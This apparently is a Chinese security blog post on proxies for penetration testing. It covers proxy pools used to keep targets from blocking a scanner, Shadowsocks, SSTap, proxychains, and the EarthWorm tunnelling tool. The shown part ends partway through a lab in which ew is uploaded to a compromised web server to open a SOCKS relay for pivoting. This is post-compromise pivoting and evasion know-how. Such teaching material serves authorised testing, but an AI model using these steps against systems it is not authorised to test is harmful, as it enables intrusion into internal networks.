

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="r1">
  <meta name="keywords" content="">
  
    <meta name="description" content="应用层代理技术应用层代理介绍应用层代理是我们最常用的代理，平时在进行内网渗透，或者扫描的时候经常需要这个代理，根据协议不同大体有以下的分类 1、http代理 2、socks代理  3、SSH代理  4、DNS代理 5、还有自定义的一些协议和加密规则 每种代理应用的场景不同，在不同的场景需要选择不同的代理 代理场景介绍一、公网资产扫描平时在做渗透测试中我们需要对公网的资产进行扫描和探测，但是又害怕对">
<meta property="og:type" content="article">
<meta property="og:title" content="应用层代理技术">
<meta property="og:url" content="http://example.com/2023/11/27/%E5%BA%94%E7%94%A8%E5%B1%82%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/index.html">
<meta property="og:site_name" content="r1ckyL&#39;s secret">
<meta property="og:description" content="应用层代理技术应用层代理介绍应用层代理是我们最常用的代理，平时在进行内网渗透，或者扫描的时候经常需要这个代理，根据协议不同大体有以下的分类 1、http代理 2、socks代理  3、SSH代理  4、DNS代理 5、还有自定义的一些协议和加密规则 每种代理应用的场景不同，在不同的场景需要选择不同的代理 代理场景介绍一、公网资产扫描平时在做渗透测试中我们需要对公网的资产进行扫描和探测，但是又害怕对">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/image-20231101101933161.png">
<meta property="og:image" content="http://example.com/img/image-20231101102015638.png">
<meta property="og:image" content="http://example.com/img/image-20231101102138583.png">
<meta property="og:image" content="http://example.com/img/image-20231101102117551.png">
<meta property="og:image" content="http://example.com/img/image-20231101103418668.png">
<meta property="og:image" content="http://example.com/img/image-20231101103757675.png">
<meta property="og:image" content="http://example.com/img/image-20231101105128680.png">
<meta property="og:image" content="http://example.com/img/image-20231101105923631.png">
<meta property="og:image" content="http://example.com/img/image-20231101110353051.png">
<meta property="og:image" content="http://example.com/img/image-20231101110514944.png">
<meta property="og:image" content="http://example.com/img/image-20231101111030680.png">
<meta property="og:image" content="http://example.com/img/image-20231101111326120.png">
<meta property="og:image" content="http://example.com/img/image-20231101112414406.png">
<meta property="og:image" content="http://example.com/img/image-20231101112448181.png">
<meta property="og:image" content="http://example.com/img/image-20231101112457877.png">
<meta property="og:image" content="http://example.com/img/image-20231101113556389.png">
<meta property="og:image" content="http://example.com/img/image-20231101113726757.png">
<meta property="og:image" content="http://example.com/img/image-20231101113757693.png">
<meta property="og:image" content="http://example.com/img/image-20231101114037807.png">
<meta property="og:image" content="http://example.com/img/image-20231101114057925.png">
<meta property="og:image" content="http://example.com/img/image-20231101114911272.png">
<meta property="og:image" content="http://example.com/img/image-20231101115016765.png">
<meta property="og:image" content="http://example.com/img/image-20231101115124375.png">
<meta property="og:image" content="http://example.com/img/image-20231101144350020.png">
<meta property="og:image" content="http://example.com/img/image-20231101144459157.png">
<meta property="og:image" content="http://example.com/img/image-20231101150505489.png">
<meta property="og:image" content="http://example.com/img/image-20231101152200192.png">
<meta property="og:image" content="http://example.com/img/image-20231101152411452.png">
<meta property="og:image" content="http://example.com/img/image-20231101155432136.png">
<meta property="og:image" content="http://example.com/img/image-20231101162838489.png">
<meta property="og:image" content="http://example.com/img/image-20231101163043106.png">
<meta property="og:image" content="http://example.com/img/image-20231101163216487.png">
<meta property="og:image" content="http://example.com/img/image-20231101164919957.png">
<meta property="og:image" content="http://example.com/img/image-20231101170117670.png">
<meta property="og:image" content="http://example.com/img/image-20231101170135655.png">
<meta property="og:image" content="http://example.com/img/image-20231101170820807.png">
<meta property="og:image" content="http://example.com/img/image-20231101171818277.png">
<meta property="og:image" content="http://example.com/img/image-20231101171809205.png">
<meta property="og:image" content="http://example.com/img/image-20231101171751567.png">
<meta property="og:image" content="http://example.com/img/image-20231101172452482.png">
<meta property="og:image" content="http://example.com/img/image-20231101173124349.png">
<meta property="og:image" content="http://example.com/img/image-20231102204519444.png">
<meta property="og:image" content="http://example.com/img/image-20231102204551285.png">
<meta property="og:image" content="http://example.com/img/image-20231102205549977.png">
<meta property="og:image" content="http://example.com/img/image-20231102210710367.png">
<meta property="og:image" content="http://example.com/img/image-20231102210825854.png">
<meta property="og:image" content="http://example.com/img/image-20231102211125334.png">
<meta property="og:image" content="http://example.com/img/image-20231102211257942.png">
<meta property="og:image" content="http://example.com/img/image-20231102211313269.png">
<meta property="og:image" content="http://example.com/img/image-20231102211421837.png">
<meta property="og:image" content="http://example.com/img/image-20231102211554088.png">
<meta property="og:image" content="http://example.com/img/image-20231111144301202.png">
<meta property="og:image" content="http://example.com/img/image-20231111144352990.png">
<meta property="og:image" content="http://example.com/img/image-20231111144554227.png">
<meta property="og:image" content="http://example.com/img/image-20231111144230064.png">
<meta property="og:image" content="http://example.com/img/image-20231111144720808.png">
<meta property="og:image" content="http://example.com/img/image-20231111145006476.png">
<meta property="og:image" content="http://example.com/img/image-20231111150408853.png">
<meta property="og:image" content="http://example.com/img/image-20231111151612225.png">
<meta property="og:image" content="http://example.com/img/image-20231111151630331.png">
<meta property="og:image" content="http://example.com/img/image-20231111151644274.png">
<meta property="og:image" content="http://example.com/img/image-20231111151704874.png">
<meta property="og:image" content="http://example.com/img/image-20231111151745090.png">
<meta property="og:image" content="http://example.com/img/image-20231111151928835.png">
<meta property="og:image" content="http://example.com/img/image-20231111154855788.png">
<meta property="og:image" content="http://example.com/img/image-20231111155023160.png">
<meta property="og:image" content="http://example.com/img/image-20231111155200826.png">
<meta property="og:image" content="http://example.com/img/image-20231111155235034.png">
<meta property="og:image" content="http://example.com/img/image-20231111155543457.png">
<meta property="og:image" content="http://example.com/img/image-20231111155757991.png">
<meta property="og:image" content="http://example.com/img/image-20231111162820321.png">
<meta property="og:image" content="http://example.com/img/image-20231111165523183.png">
<meta property="og:image" content="http://example.com/img/image-20231111165629608.png">
<meta property="og:image" content="http://example.com/img/image-20231111165658628.png">
<meta property="og:image" content="http://example.com/img/image-20231111165712924.png">
<meta property="og:image" content="http://example.com/img/image-20231111165730109.png">
<meta property="og:image" content="http://example.com/img/image-20231111165744205.png">
<meta property="og:image" content="http://example.com/img/image-20231111165831213.png">
<meta property="og:image" content="http://example.com/img/image-20231111173322349.png">
<meta property="og:image" content="http://example.com/img/image-20231111173339816.png">
<meta property="og:image" content="http://example.com/img/image-20231111173352698.png">
<meta property="og:image" content="http://example.com/img/image-20231111173408727.png">
<meta property="og:image" content="http://example.com/img/image-20231111173427876.png">
<meta property="og:image" content="http://example.com/img/image-20231111174552095.png">
<meta property="og:image" content="http://example.com/img/image-20231111174645693.png">
<meta property="og:image" content="http://example.com/img/image-20231111203722061.png">
<meta property="og:image" content="http://example.com/img/image-20231111203912172.png">
<meta property="og:image" content="http://example.com/img/image-20231111205217099.png">
<meta property="og:image" content="http://example.com/img/image-20231111205904885.png">
<meta property="og:image" content="http://example.com/img/image-20231111205922028.png">
<meta property="og:image" content="http://example.com/img/image-20231111210437649.png">
<meta property="og:image" content="http://example.com/img/image-20231111210455707.png">
<meta property="og:image" content="http://example.com/img/image-20231111210535696.png">
<meta property="og:image" content="http://example.com/img/image-20231111210918853.png">
<meta property="og:image" content="http://example.com/img/image-20231111211434360.png">
<meta property="og:image" content="http://example.com/img/image-20231111211459922.png">
<meta property="og:image" content="http://example.com/img/image-20231111211602005.png">
<meta property="og:image" content="http://example.com/img/image-20231111211616197.png">
<meta property="og:image" content="http://example.com/img/image-20231111211635793.png">
<meta property="og:image" content="http://example.com/img/image-20231111211659252.png">
<meta property="og:image" content="http://example.com/img/image-20231111211743214.png">
<meta property="og:image" content="http://example.com/img/image-20231111211808811.png">
<meta property="og:image" content="http://example.com/img/image-20231111211825328.png">
<meta property="article:published_time" content="2023-11-27T03:39:43.000Z">
<meta property="article:modified_time" content="2023-11-27T03:43:51.247Z">
<meta property="article:author" content="r1">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/img/image-20231101101933161.png">
  
  
  
  <title>应用层代理技术 - r1ckyL&#39;s secret</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"VM6iIPhII9dNKYvDTSfaQlfY-MdYXbMMI","app_key":"ji1dPD8DG5BrS1OfKrqzGDUL","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>r1ckyL</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="应用层代理技术"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-11-27 11:39" pubdate>
          2023年11月27日 中午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.8k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          65 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">应用层代理技术</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="应用层代理技术"><a href="#应用层代理技术" class="headerlink" title="应用层代理技术"></a>应用层代理技术</h1><h1 id="应用层代理介绍"><a href="#应用层代理介绍" class="headerlink" title="应用层代理介绍"></a>应用层代理介绍</h1><p>应用层代理是我们最常用的代理，平时在进行内网渗透，或者扫描的时候经常需要这个代理，根据协议不同大体有以下的分类</p>
<p>1、http代理</p>
<p>2、socks代理 </p>
<p>3、SSH代理 </p>
<p>4、DNS代理</p>
<p>5、还有自定义的一些协议和加密规则</p>
<p>每种代理应用的场景不同，在不同的场景需要选择不同的代理</p>
<h2 id="代理场景介绍"><a href="#代理场景介绍" class="headerlink" title="代理场景介绍"></a>代理场景介绍</h2><h3 id="一、公网资产扫描"><a href="#一、公网资产扫描" class="headerlink" title="一、公网资产扫描"></a>一、公网资产扫描</h3><p>平时在做渗透测试中我们需要对公网的资产进行扫描和探测，但是又害怕对方封掉你的IP地址，我们需要挂代理</p>
<img src="/img/image-20231101101933161.png" srcset="/img/loading.gif" lazyload alt="image-20231101101933161" style="zoom:80%;" /> 

<p>在这种情况我我们需要哪些东西走代理呢？</p>
<p>1、扫描器工具</p>
<p>2、浏览器 </p>
<p>3、burpsuite</p>
<p>使用代理一般是用http代理或者socks代理代理后的拓扑如下</p>
<img src="/img/image-20231101102015638.png" srcset="/img/loading.gif" lazyload alt="image-20231101102015638" style="zoom:80%;" /> 

<p>这里的代理分为两类 </p>
<p>1、单个代理：单代理就是一个代理机器，只有一个IP，不会自动切换</p>
<img src="/img/image-20231101102138583.png" srcset="/img/loading.gif" lazyload alt="image-20231101102138583" style="zoom:80%;" /> 

<p>2、代理池：代理池就是一堆IP地址，可以实现自动变化，每次请求都变化</p>
<img src="/img/image-20231101102117551.png" srcset="/img/loading.gif" lazyload alt="image-20231101102117551" style="zoom:80%;" /> 

<p>注意：有些工具支持可以将单个代理IP写到文本中，从而实现代理池的功能</p>
<h3 id="二、内网资产扫描"><a href="#二、内网资产扫描" class="headerlink" title="二、内网资产扫描"></a>二、内网资产扫描</h3><p>内网资产扫描这种场景一般是进行内网渗透才需要的代理技术，如果你不打内网一般是不需要这种技术的，内网代理技术一般也是采用http或者socks代理</p>
<img src="/img/image-20231101103418668.png" srcset="/img/loading.gif" lazyload alt="image-20231101103418668" style="zoom:80%;" /> 

<p>针对以上的情况我们需要如何对内网进行扫描呢？ </p>
<p>1、直接使用web服务进行扫描</p>
<p>2、做代理让web服务成为代理机器</p>
<p>针对于内网的机器要考虑是用代理隧道还是使用端口转发</p>
<p>在这种情况需要用什么工具走代理呢？ </p>
<p>1、扫描工具 </p>
<p>2、浏览器 </p>
<p>3、burp</p>
<p>使用代理一般是用http代理或者socks代理代理后的拓扑如下</p>
<img src="/img/image-20231101103757675.png" srcset="/img/loading.gif" lazyload alt="image-20231101103757675" style="zoom:80%;" /> 

<p>总体就是这样的情况第一种一般是买代理，第二种一般是做代理</p>
<h1 id="1-公网资产扫描代理配置"><a href="#1-公网资产扫描代理配置" class="headerlink" title="1.公网资产扫描代理配置"></a>1.公网资产扫描代理配置</h1><h2 id="单代理配置"><a href="#单代理配置" class="headerlink" title="单代理配置"></a>单代理配置</h2><h3 id="单代理介绍"><a href="#单代理介绍" class="headerlink" title="单代理介绍"></a>单代理介绍</h3><p>平时在做渗透测试中我们需要对公网的资产进行扫描和探测，但是又害怕对方封掉你的IP地址，或者IP 已经封了我们需要挂代理</p>
<p><img src="/img/image-20231101105128680.png" srcset="/img/loading.gif" lazyload alt="image-20231101105128680"> </p>
<h3 id="单个代理"><a href="#单个代理" class="headerlink" title="单个代理"></a>单个代理</h3><p>单个代理表示就一个IP代理机器，IP地址不会自动切换</p>
<p>单个代理一般大家都用的免费的</p>
<p>一般免费的这种单个代理有以下的弊端 </p>
<p>1、使用人比较多网速比较慢，很多都用不了 </p>
<p>2、有可能这些代理是有些公司主动放出的用来收集用户信息</p>
<h3 id="筛选代理"><a href="#筛选代理" class="headerlink" title="筛选代理"></a>筛选代理</h3><p>1、购买或者使用免费的单个代理IP</p>
<p>网站：<a target="_blank" rel="noopener" href="https://www.kuaidaili.com/">https://www.kuaidaili.com</a> </p>
<p>快代理提供了免费的单个代理IP,也可以花钱购买自己独有的IP</p>
<img src="/img/image-20231101105923631.png" srcset="/img/loading.gif" lazyload alt="image-20231101105923631" style="zoom:80%;" /> 

<p>2、将IP地址整理然后进行测试，看一下那个可以用</p>
<p>可以使用代理检测工具检测一下 </p>
<p><a target="_blank" rel="noopener" href="http://www.leishenhttp.com/index/check/index.html">http://www.leishenhttp.com/index/check/index.html</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.zdaye.com/ip/CheckHttp/">https://www.zdaye.com/ip/CheckHttp/</a></p>
<p><img src="/img/image-20231101110353051.png" srcset="/img/loading.gif" lazyload alt="image-20231101110353051"></p>
<h3 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h3><p>1、浏览器</p>
<p><img src="/img/image-20231101110514944.png" srcset="/img/loading.gif" lazyload alt="image-20231101110514944"> </p>
<p>2、burp</p>
<p>useroptions</p>
<p><img src="/img/image-20231101111030680.png" srcset="/img/loading.gif" lazyload alt="image-20231101111030680"> </p>
<p>3、工具有些扫描工具是支持代理的可以查看工具的具体命令看看用法</p>
<img src="/img/image-20231101111326120.png" srcset="/img/loading.gif" lazyload alt="image-20231101111326120" style="zoom: 67%;" /> 

<h2 id="代理池配置"><a href="#代理池配置" class="headerlink" title="代理池配置"></a>代理池配置</h2><p>代理池的意思就是拥有多个代理可以随意切换的东西，那么代理池一般有几种用法呢 </p>
<p>1、购买代理池，购买的东西会自动切换IP，简单又方便 </p>
<p>2、有些工具可以支持文本代理的方式，就是将很多单个IP代理放在一个文件里面，他会自动使用和切换</p>
<h3 id="购买代理池"><a href="#购买代理池" class="headerlink" title="购买代理池"></a>购买代理池</h3><p>购买完成之后需要填写地址和端口还有域名</p>
<p><img src="/img/image-20231101112414406.png" srcset="/img/loading.gif" lazyload alt="image-20231101112414406"></p>
<h3 id="使用代理池"><a href="#使用代理池" class="headerlink" title="使用代理池"></a>使用代理池</h3><p>1、使用浏览器</p>
<p>2、使用BURP</p>
<p><img src="/img/image-20231101112448181.png" srcset="/img/loading.gif" lazyload alt="image-20231101112448181"></p>
<p>代理后访问百度</p>
<p><img src="/img/image-20231101112457877.png" srcset="/img/loading.gif" lazyload alt="image-20231101112457877"></p>
<p>3、使用工具  很多工具不支持代理，或者不支持密码认证这个使用想用代理怎么办，就需要使用第三方的工具来进行代理的使用（专业技代理：例如proxifier proxychain）</p>
<h2 id="SSTAP和Shadowsocks"><a href="#SSTAP和Shadowsocks" class="headerlink" title="SSTAP和Shadowsocks"></a>SSTAP和Shadowsocks</h2><p>当我们想让我们的电脑全局都走代理的时候，就需要使用到全局代理，设置了全局代理我们的任何工具 直接使用不需要再做任何的配置，所有使用工具 使用BP浏览器不用做任何的配置，默认就走代理，这 种方式最推荐</p>
<h3 id="Shadowsocks（与clash原理相同）"><a href="#Shadowsocks（与clash原理相同）" class="headerlink" title="Shadowsocks（与clash原理相同）"></a>Shadowsocks（与clash原理相同）</h3><p>声明：v2ray &#x2F; winXray &#x2F; Clash &#x2F; Shadowrocket &#x2F; Quantumult ，目前这种科学上网的方式也是属于代 理的技术</p>
<p>这种工具一般是SSR订阅得到IP地址的，支持全局代理和本地代理</p>
<h4 id="Shadowsocks-原理介绍"><a href="#Shadowsocks-原理介绍" class="headerlink" title="Shadowsocks-原理介绍"></a>Shadowsocks-原理介绍</h4><p>使用自己的的协议和加密方式，用软件连接代理访问外网</p>
<p><img src="/img/image-20231101113556389.png" srcset="/img/loading.gif" lazyload alt="image-20231101113556389"></p>
<h4 id="搭建方式"><a href="#搭建方式" class="headerlink" title="搭建方式"></a>搭建方式</h4><p>1、首先找一个国外的服务器（专业名字叫VPS）在机器上配置相应的规则和混淆</p>
<p><img src="/img/image-20231101113726757.png" srcset="/img/loading.gif" lazyload alt="image-20231101113726757"></p>
<p>2、使用该工具连接服务器，使用相同的加密方式，进行连接</p>
<p><img src="/img/image-20231101113757693.png" srcset="/img/loading.gif" lazyload alt="image-20231101113757693"></p>
<h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><p>该工具支持全局和PAC，全局的意思就是所有的工具都会通过该工具进行代理</p>
<p><strong>全局模式</strong></p>
<p>全局模式会在系统代理设置⼿动设置⼀个代理服务器，所有跟随系统代理设置的软件(⼀般是浏览器)都 会使⽤这个代理服务器。</p>
<p><img src="/img/image-20231101114037807.png" srcset="/img/loading.gif" lazyload alt="image-20231101114037807"></p>
<p><strong>PAC</strong></p>
<p>代理⾃动配置(英语：Proxy auto-config，简称PAC)是⼀种⽹页浏览器技术，⽤于定义浏览器该如何⾃ 动选择适当的代理服务器来访问⼀个⽹址</p>
<p><img src="/img/image-20231101114057925.png" srcset="/img/loading.gif" lazyload alt="image-20231101114057925"></p>
<h3 id="SSTAP-适合全局代理"><a href="#SSTAP-适合全局代理" class="headerlink" title="SSTAP(适合全局代理)"></a>SSTAP(适合全局代理)</h3><h4 id="SSTAP介绍"><a href="#SSTAP介绍" class="headerlink" title="SSTAP介绍"></a>SSTAP介绍</h4><p>SSTap简介 SSTap是SocksCap64作者新开发的一款利用虚拟网卡实现的网络层代理。支持TCP,UDP，该 工具使用简单，可以使用于游戏，建议大家使用这个进行扫描 </p>
<h4 id="SSTAP安装"><a href="#SSTAP安装" class="headerlink" title="SSTAP安装"></a>SSTAP安装</h4><p>1、一直点击下一步安装</p>
<p>2、中途会给电脑安装一个虚拟网卡</p>
<p><img src="/img/image-20231101114911272.png" srcset="/img/loading.gif" lazyload alt="image-20231101114911272"> </p>
<p>3、完成之后可以配置HTTP代理socks代理还有订阅链接</p>
<p><img src="/img/image-20231101115016765.png" srcset="/img/loading.gif" lazyload alt="image-20231101115016765"> </p>
<p>4、支持的方式有全局和浏览器</p>
<p><img src="/img/image-20231101115124375.png" srcset="/img/loading.gif" lazyload alt="image-20231101115124375"> </p>
<h4 id="SSTP使用"><a href="#SSTP使用" class="headerlink" title="SSTP使用"></a>SSTP使用</h4><p>1、浏览器使用 </p>
<p>2、burp使用 </p>
<p>3、cmd使用</p>
<h1 id="2-应用层内网代理"><a href="#2-应用层内网代理" class="headerlink" title="2.应用层内网代理"></a>2.应用层内网代理</h1><h2 id="内网代理介绍"><a href="#内网代理介绍" class="headerlink" title="内网代理介绍"></a>内网代理介绍</h2><p>内网资产扫描这种场景一般是进行内网渗透才需要的代理技术，如果不打内网一般是不需要这种技术 的，内网代理技术一般也是采用http或者socks代理</p>
<p><img src="/img/image-20231101144350020.png" srcset="/img/loading.gif" lazyload alt="image-20231101144350020"></p>
<p>针对以上的情况我们需要如何对内网进行扫描呢？ </p>
<p>1、直接使用web服务进行扫描（参考内网渗透） </p>
<p>2、做代理让web服务成为代理机器</p>
<p>针对于内网的机器要考虑是用代理隧道还是使用端口转发</p>
<p>在这种情况需要用什么工具走代理呢？ </p>
<p>1、扫描工具 </p>
<p>2、浏览器 </p>
<p>3、burp </p>
<p>使用代理一般是用http代理或者socks代理代理后的拓扑如下</p>
<p><img src="/img/image-20231101144459157.png" srcset="/img/loading.gif" lazyload alt="image-20231101144459157"></p>
<h2 id="代理连接工具"><a href="#代理连接工具" class="headerlink" title="代理连接工具"></a>代理连接工具</h2><h3 id="windows工具"><a href="#windows工具" class="headerlink" title="windows工具"></a>windows工具</h3><p>如果是windows是proxifire工具</p>
<p>1、运行软件然后点进进行一步一步安装</p>
<p>2、安装完成运行软件</p>
<p>3、打开代理服务器配置，可以看到支持http和socks代理</p>
<img src="/img/image-20231101150505489.png" srcset="/img/loading.gif" lazyload alt="image-20231101150505489" style="zoom:80%;" /> 

<p>4、该工具支持代理链，代理链可以支持多级代理</p>
<h3 id="linux工具"><a href="#linux工具" class="headerlink" title="linux工具"></a>linux工具</h3><p>linux工具下一般使用命令行工具proxychains</p>
<p>该工具在kali中自带</p>
<p>安装步骤 </p>
<p>1、下载Proxychains源码，可以从GitHub上下载，或者直接从官网下载<a target="_blank" rel="noopener" href="https://github.com/rofl0r/proxychains-ng">https://github.com/rofl0r/proxychains-ng</a></p>
<p>2、解压文件然后进行安装</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">tar zxvf proxychains-ng-<span class="hljs-number">4.16</span>.tar.gz<br><span class="hljs-keyword">cd</span> proxychains-ng-<span class="hljs-number">4.16</span><br>./configure<br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure>

<p>3、安装完成之后，需要修改配置文件&#x2F;usr&#x2F;local&#x2F;etc&#x2F;proxychains.conf(其中kali的在&#x2F;etc&#x2F;proxychains4.conf)，将其中的代理服务器修改为你的代理服务器</p>
<p><img src="/img/image-20231101152200192.png" srcset="/img/loading.gif" lazyload alt="image-20231101152200192"> </p>
<p>4、修改完成之后，可以使用proxychains命令来使用代理服务器，示例</p>
<p><img src="/img/image-20231101152411452.png" srcset="/img/loading.gif" lazyload alt="image-20231101152411452"> </p>
<h2 id="EW-EarthWorm-工具"><a href="#EW-EarthWorm-工具" class="headerlink" title="EW(EarthWorm)工具"></a>EW(EarthWorm)工具</h2><h3 id="Earthworm简介"><a href="#Earthworm简介" class="headerlink" title="Earthworm简介"></a>Earthworm简介</h3><p>Earthworm简称EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功 能，可在复杂网络环境下完成网络穿透</p>
<p>该工具已经停止维护和下载：<a target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p>
<p>该工具支持端口转发，正向代理，反向代理，多级代理等方式，可以打通一条网络隧道，直达网络深 处，用蚯蚓独有的手段突破网络限制</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
<h3 id="1-（一级代理）正向代理"><a href="#1-（一级代理）正向代理" class="headerlink" title="1.（一级代理）正向代理"></a>1.（一级代理）正向代理</h3><p>拓扑图如下 </p>
<p>正向意思就是攻击者可以访问目标的机器，也就意味着目标的机器在公网，如下拓扑，例如通过web漏洞打进去</p>
<p><img src="/img/image-20231101155432136.png" srcset="/img/loading.gif" lazyload alt="image-20231101155432136"></p>
<p>正向连接就是黑客主动连接web服务器，在web开启监听</p>
<p>将ew上传到web服务器 并且执行如下命令</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ew</span> -s ssocksd -l <span class="hljs-number">1080</span><br></code></pre></td></tr></table></figure>

<p>黑客的电脑使用froxyifile或者proxychains等工具进行连接</p>
<h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><p>1、使用漏洞将web服务器控制下来然后上传ew工具执行开启监听</p>
<p><img src="/img/image-20231101162838489.png" srcset="/img/loading.gif" lazyload alt="image-20231101162838489"> </p>
<p>2、使用proxyifile连接</p>
